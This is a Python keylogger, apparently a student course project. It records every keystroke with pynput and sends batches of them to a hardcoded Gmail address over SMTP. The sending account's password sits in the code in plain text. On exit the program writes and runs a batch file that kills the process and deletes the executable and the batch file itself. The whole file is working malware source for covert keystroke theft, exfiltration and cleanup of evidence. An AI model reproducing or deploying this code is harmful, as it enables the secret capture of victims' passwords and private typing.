from pynput import keyboard
import time
import smtplib
from os import remove, path
import subprocess
from sys import argv

destEmail = 'keylogsenderUIUC460@gmail.com'
dataBufferSize = 100
local = False

data = ""
hackeremail = "keylogsenderUIUC460"
hackerpwd =  "qazwsxedcrfv"


holdDowns = ['Key.ctrl_l', 'Key.ctrl_r', 
			 'Key.shift', 'Key.shift_r',
			 'Key.alt_l', 'Key.alt_r']


def serverSetup():
	global hackeremail, hackerpwd
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(hackeremail, hackerpwd)
	return server

def send_data():
	print('sending data')
	global data
	try:
		msg = data
		server.sendmail("keylogsenderUIUC460@gmail.com", destEmail, msg)
		data='' #reset data
		print("sending complete")
	except Exception as e:
		print('Exception: ' + str(e))


def on_press(key):
	print(key)
	if(local):
		try:
			f.write('{0}\n'.format(
				key.char))
			#if(key.char == '`'):
			#	 keyboard.Listener.stop
		except AttributeError:
			f.write('{0}\n'.format(
				key))
	else:
		global data
		try:
			data += str(key.char) + '\n'
		except AttributeError:
			data += str(key) + '\n'
		finally:
			if(len(data) > dataBufferSize):
				send_data()

def on_release(key):
	if(local):
		if(str(key) in holdDowns):
			f.write('{0} Released\n'.format(
				key))
	else:
		global data
		if(str(key) in holdDowns):
			data += str(key) + ' released\n'
		if(len(data) > dataBufferSize):
			send_data()
	if(key == keyboard.Key.esc):
		#stop listener
		return False

def run_keylogger():
	#collect events until released
	with keyboard.Listener(
			on_press=on_press,
			on_release=on_release
			) as listener:

		print("joining")
		listener.join()
		print("joined")
def selfDelete():
	#create selfdelete file
	BATTXT = ("@ECHO OFF\n"
		  +"SETLOCAL\n"
		  +"TASKKILL /IM \"keylogger.exe\"\n"
		  +"DEL \""+argv[0]+"\"\n"
		  +"DEL \"%~f0\"") 
	d = open("del.bat", 'w')
	d.write(BATTXT)
	d.close()

	#run selfdelete file on exe
	if(__file__!="keylogger.py"):
		subprocess.Popen(path.dirname(path.abspath(__file__))+"\\del.bat")

def main():
	print(argv[0])
	if(local):
		f = open('keylog.txt', 'w')
		print("logging to file...")
	else:
		print("logging to email...")
		global server 
		server = serverSetup()
	run_keylogger()

	if(local):
		f.close()
	selfDelete()

if __name__== "__main__":
  main()
